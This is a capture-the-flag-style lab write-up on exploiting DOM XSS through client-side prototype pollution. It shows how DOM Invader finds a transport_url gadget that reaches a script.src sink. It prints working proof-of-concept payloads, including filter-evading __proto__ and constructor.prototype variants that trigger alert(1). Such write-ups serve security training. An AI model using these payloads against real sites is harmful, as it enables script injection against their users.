## DOM XSS via client-side prototype pollution

This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:

1. Find a source that you can use to add arbitrary properties to the global Object.prototype.
2. Identify a gadget property that allows you to execute arbitrary JavaScript.
3. Combine these to call alert().

You can solve this lab manually in your browser, or use DOM Invader to help you.

## Notes

- Search page 
- Possibility to leave a comment
- Feedback feature on /feedback
- /searchLogger.js
- /deparam.js

## Resume

1. Enable DOM Invader.
2. Detect prototype pollution in the `search` parameter.
3. Scan for gadgets.
4. Identify the `transport_url` gadget.
5. Observe the `script.src` sink.
6. Set `transport_url` to a `data:` URL.
7. Trigger `alert(1)` and solve the lab.

## Solve

Open the lab in Burp's built-in browser.

Enable DOM Invader and activate the **Prototype Pollution** option.

Reload the page and observe that DOM Invader detects prototype pollution vectors in the `search` query parameter.

Example canary request:

```http
GET /?search=rxnnr82h
```

DOM Invader reports a gadget chain involving the `transport_url` property.

The gadget discovery result shows:

| Field | Value |
|---------|---------|
| Value | `rxnnr82hprototypepollutiontransport_urlrxnnr82h` |
| outerHTML | `<script></script>` |
| Frame path | `top` |
| Event | `load` |
| Sink | `script.src` |
| Gadget | `transport_url` |

The relevant stack trace points to the vulnerable code:

```text
searchLogger()
  -> script.src = config.transport_url
```

```javascript
at searchLogger (.../searchLogger.js:14:20)
```

Click **Scan for gadgets**.

Once the scan completes, open the DOM Invader tab and observe that the gadget reaches the following sink:

```javascript
script.src
```

DOM Invader confirms:

```text
Source:
search

Gadget:
transport_url

Sink:
script.src
```

Click **Exploit**.

DOM Invader automatically generates the proof-of-concept payload:

```text
/?search=rxnnr82h
&constructor[prototype][transport_url]=data:,alert(1)
&constructor.prototype.transport_url=data:,alert(1)
&__proto__.transport_url=data:,alert(1)
&__proto__[transport_url]=data:,alert(1)
&constrconstructoructor[prototype][transport_url]=data:,alert(1)
&constrconstructoructor.prototype.transport_url=data:,alert(1)
&__pro__proto__to__.transport_url=data:,alert(1)
&__pro__proto__to__[transport_url]=data:,alert(1)
```

A simplified payload is:

```http
GET /?search=rxnnr82h&__proto__[transport_url]=data:,alert(1)
```

This pollutes:

```javascript
Object.prototype.transport_url = "data:,alert(1)"
```

When the page later creates a script element, it reads the inherited property and assigns it to:

```javascript
script.src = transport_url
```

The browser loads:

```text
data:,alert(1)
```

which executes JavaScript and triggers:

```javascript
alert(1)
```